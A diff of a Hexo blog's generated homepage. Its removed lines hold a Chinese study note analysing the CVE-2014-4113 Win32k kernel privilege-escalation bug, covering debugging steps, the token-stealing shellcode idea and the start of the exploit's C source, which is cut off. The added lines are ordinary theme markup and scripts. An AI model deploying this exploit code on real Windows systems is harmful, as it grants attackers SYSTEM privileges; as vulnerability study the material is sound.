@@ -1,293 +1,184 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Hexo',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-05-31 00:51:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
   
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
-
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-CVE-2014-4113提权漏洞学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/05/31/CVE-2014-4113%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time class="dt-published" datetime="2023-05-30T16:26:59.203Z" itemprop="datePublished">2023-05-31</time>
-</a>
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="CVE-2014-4113提权漏洞学习笔记"><a href="#CVE-2014-4113提权漏洞学习笔记" class="headerlink" title="CVE-2014-4113提权漏洞学习笔记"></a>CVE-2014-4113提权漏洞学习笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最近学习了一个CVE-2014-4113windows内核提权漏洞，漏洞点在驱动文件Win32k.sys中的xxxHandleMenuMessage函数，原因是该函数中没有对的xxxMNFindWindowFromPoint的某些返回值进行验证，并且作为参数传递给xxxSendMessage函数调用，造成我们可以把shellcode放在某个位置，让xxxSendMessage函数中一段语句调用，从而造成提权漏洞</p>
-<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>Win7 x86 sp1 专业版</p>
-<p>Visual Studio 2019</p>
-<p>IDA Pro</p>
-<p>WinDbg</p>
-<p>安装Win7 x86 sp1 专业版之后会发现无法安装VMware Tools,所以我们要去下载一个补丁<a target="_blank" rel="noopener" href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB976932"></a>，之后就可以安装VMware Tools了</p>
-<p>用vmmon64可以很方便的连接上虚拟机和WinDbg,再通过ida的一个插件(sync)让ida连接上WinDbg,但我连接之后发现了一个问题，就是我的WinDbg的寄存器一栏没有值</p>
-<p><img src="https://s2.loli.net/2023/05/31/TFydlZRXJ3LsIq8.png" alt="1.png"></p>
-<p>去网上下了一个Windbg.dll之后再用</p>
-<p><code>!WingDbg.regfix</code></p>
-<p>就解决了</p>
-<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>因为这个漏洞的年份很古老，我们可以直接从网上找到对应漏洞的EXP，通过分析EXP来入手，下面有一些解释，先不直接看完整代码，我把完整代码放在最后面，跟着我的思路来,代码的大致结构如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line"></span><br><span class="line">	Poc();</span><br><span class="line"></span><br><span class="line">	CreateCmd();</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Hexo</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/05/31/CVE-2014-4113%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="No title">No title</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-30T16:26:59.203Z" title="Created 2023-05-31 00:26:59">2023-05-31</time></span></div><div class="content">CVE-2014-4113提权漏洞学习笔记简介最近学习了一个CVE-2014-4113windows内核提权漏洞，漏洞点在驱动文件Win32k.sys中的xxxHandleMenuMessage函数，原因是该函数中没有对的xxxMNFindWindowFromPoint的某些返回值进行验证，并且作为参数传递给xxxSendMessage函数调用，造成我们可以把shellcode放在某个位置，让xxxSendMessage函数中一段语句调用，从而造成提权漏洞
+环境配置Win7 x86 sp1 专业版
+Visual Studio 2019
+IDA Pro
+WinDbg
+安装Win7 x86 sp1 专业版之后会发现无法安装VMware Tools,所以我们要去下载一个补丁，之后就可以安装VMware Tools了
+用vmmon64可以很方便的连接上虚拟机和WinDbg,再通过ida的一个插件(sync)让ida连接上WinDbg,但我连接之后发现了一个问题，就是我的WinDbg的寄存器一栏没有值
 
-<p>简单介绍一下各部分功能，细节还是看完整代码，init();主要是在进程的虚拟地址空间中分配内存区域，并且修改了某些地址，Poc();就是创了几个窗口并对当前线程下了个钩子，检查传递给它的消息参数是否与指定的消息相符（0x1EB），如果是会调用 CallNextHookEx 函数来将控制权交还给下一个钩子函数来结束菜单的显示，并返回一个-5，CreateCmd的功能就和它名字差不多</p>
-<p>先运行一下EXP之前是什么样子的</p>
-<p><img src="https://s2.loli.net/2023/05/31/VYiWBzhPXU4v5pL.png" alt="4.png"></p>
-<p>运行之后</p>
-<p><img src="https://s2.loli.net/2023/05/31/xpKHnl15q7dvjUX.png" alt="5.png"></p>
-<p>能看见弹出一个cmd窗口，并且权限提高了</p>
-<h3 id="调试EXP"><a href="#调试EXP" class="headerlink" title="调试EXP"></a>调试EXP</h3><p>接下来我们用EXP来调试一下</p>
-<p>我们现在还不清楚漏洞点的具体位置，但我们能够知道我们的shellcode是漏洞点过来的，谁调用了shellcode谁就是漏洞点，我们直接在shellcode代码的最前面设置一个int3，看堆栈里面存放的函数返回地址可以知道是什么函数里面调用的shellcode，再在这个函数里面找</p>
-<p>我们的shellcode就是找到system的token，用system的token覆盖exp的token从而实现提权</p>
-<p><img src="https://s2.loli.net/2023/05/31/S5Ln4Xy2ADxBr6h.png" alt="9.png"></p>
-<p>可以看见进入shellcode之前的调用栈</p>
-<h3 id="跟着调试"><a href="#跟着调试" class="headerlink" title="跟着调试"></a>跟着调试</h3><p>我们先在win32k!xxxTrackPopupMenuEx下一个断点，直接跟着走一遍</p>
-<h4 id="xxxTrackPopupMenuEx"><a href="#xxxTrackPopupMenuEx" class="headerlink" title="xxxTrackPopupMenuEx"></a>xxxTrackPopupMenuEx</h4><p>TrackPopupMenuEx 是一个Windows API函数，用于在指定位置显示弹出菜单，并跟踪该菜单的用户交互。由之前的调用栈可以知道下一层函数为xxxMNLoop，是该函数的一个消息循环，进去看看</p>
-<h4 id="xxxMNLoop"><a href="#xxxMNLoop" class="headerlink" title="xxxMNLoop"></a>xxxMNLoop</h4><p>在该函数里面的xxxHandleMenuMessages是自己的消息处理函数，也是之前调用栈的下一层，我们继续看</p>
-<h4 id="xxxHandleMenuMessage"><a href="#xxxHandleMenuMessage" class="headerlink" title="xxxHandleMenuMessage"></a>xxxHandleMenuMessage</h4><p>HandleMenuMessage函数可能是一个应用程序中处理菜单消息的函数</p>
-<p><img src="https://s2.loli.net/2023/05/31/wr4nNhyEKHxmVGs.png" alt="3.png"></p>
-<p>可以看见xxxMNFindWindowFromPoint的返回值传递给iRet，经过IsMFMWFPWindow函数传递给v46，通过一个if进入下面的语句，紧接着我们分析一下xxxMNFindWindowFromPoint函数，IsMFMWFPWindow函数和xxxSendMessage函数</p>
-<h4 id="xxxSendMessage"><a href="#xxxSendMessage" class="headerlink" title="xxxSendMessage"></a>xxxSendMessage</h4><p>因为我们漏洞点在xxxSendMessage函数中，我们就先从xxxSendMessage函数下手，直接在ida里面进入xxxSendMessage函数，SendMessage函数是用来将一个消息发送到指定的窗口或控件，并等待接收方处理完该消息后才返回</p>
-<h5 id="xxxSendMessage的函数定义："><a href="#xxxSendMessage的函数定义：" class="headerlink" title="xxxSendMessage的函数定义："></a>xxxSendMessage的函数定义：</h5><p>LRESULT SendMessage(  HWND   hWnd,  UINT   Msg,  WPARAM wParam,  LPARAM lParam )<em>;</em></p>
-<ul>
-<li>hWnd：要接收消息的窗口的句柄。</li>
-<li>Msg：要发送的消息的类型。</li>
-<li>wParam：一个无符号整数，通常用于传递一些额外的数据给接收方处理消息。</li>
-<li>lParam：一个长整型的值，也用于传递一些额外的数据给接收方。</li>
-</ul>
-<p><img src="https://s2.loli.net/2023/05/31/J1aMFOYsIBrl9d3.png" alt="2.png"></p>
-<h5 id="xxxSendMessageTimeout"><a href="#xxxSendMessageTimeout" class="headerlink" title="xxxSendMessageTimeout"></a>xxxSendMessageTimeout</h5><p>可以看见xxxSendMessage的功能是通过调用xxxSendMessageTimeout函数来实现的</p>
-<p>我们可以发现我们直接在shellcode的最前面下断点，并断下来之后的调用栈就到这里结束了，我们先直接在ida里面对xxxSendMessageTimeout下断点</p>
-<p><img src="https://s2.loli.net/2023/05/31/rXTDBlEqvksYydK.png" alt="10.png"></p>
-<p>现在很明确，漏洞点就在这个函数里面，该函数会调用我们的shellcode，所以我们寻找可疑的call</p>
-<img src="D:\document\md\CVE-2014-4113提权漏洞学习笔记\picture\11.png" style="zoom:80%;" />
+去网上下了一个Windbg.dll之后再用
+!WingDbg.regfix
+就解决了
+漏洞原 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/05/26/hello-world/" title="Hello World">Hello World</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-26T15:41:34.729Z" title="Created 2023-05-26 23:41:34">2023-05-26</time></span></div><div class="content">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;
 
-<p><img src="https://s2.loli.net/2023/05/31/2GTEcYugJBbN85r.png" alt="12.png"></p>
-<p>此时我们的esi为-5，这里是call dword ptr [0x5B],就是我们exp里面修改为shellcode的位置</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(WINAPI* My_NtAllocateVirtualMemory)</span>	<span class="comment">//为指定进程分配虚拟内存空间</span></span><br><span class="line">	<span class="params">(</span></span><br><span class="line"><span class="params">	IN HANDLE ProcessHandle,							<span class="comment">//要分配虚拟内存的目标进程句柄</span></span></span><br><span class="line"><span class="params">	IN OUT PVOID* BaseAddress,							<span class="comment">//用于接收分配后空间的起始地址</span></span></span><br><span class="line"><span class="params">	IN ULONG ZeroBits,									<span class="comment">//用于指定要保留地址空间中的前导零位数目</span></span></span><br><span class="line"><span class="params">	IN OUT PULONG RegionSize,							<span class="comment">//用于接收被分配的内存区域大小</span></span></span><br><span class="line"><span class="params">	IN ULONG AllocationType,							<span class="comment">//内存的分配属性</span></span></span><br><span class="line"><span class="params">	IN ULONG Protect									<span class="comment">//内存区域的访问权限</span></span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line"></span><br><span class="line">My_NtAllocateVirtualMemory NtAllocateVirtualMemory = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Destroys the menu and then returns -5, this will be passed to xxxSendMessage which will then use it as a pointer.</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">HookCallbackTwo</span><span class="params">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Callback two called.\n&quot;</span>);</span><br><span class="line">	EndMenu();	<span class="comment">//使用 EndMenu() 函数来结束菜单的显示，并恢复输入焦点。如果不调用 EndMenu() 函数，则菜单会一直保持打开状态，直到用户选择了某个菜单项或者通过 ESC 键取消菜单</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">-5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">HookCallback</span><span class="params">(<span class="type">int</span> code, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Callback one called.\n&quot;</span>);</span><br><span class="line">	<span class="comment">/* lParam is a pointer to a CWPSTRUCT which is defined as:</span></span><br><span class="line"><span class="comment">	typedef struct tagCWPSTRUCT &#123;</span></span><br><span class="line"><span class="comment">	LPARAM lParam;</span></span><br><span class="line"><span class="comment">	WPARAM wParam;</span></span><br><span class="line"><span class="comment">	UINT   message;</span></span><br><span class="line"><span class="comment">	HWND   hwnd;</span></span><br><span class="line"><span class="comment">	&#125; CWPSTRUCT, *PCWPSTRUCT, *LPCWPSTRUCT;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">//lparam+8 是指向发送给窗口的消息的地址。在这里，我们正在检查当调用函数 xxxMNFindWindowFromPoint 时发送给窗口的消息。</span></span><br><span class="line">	<span class="keyword">if</span> 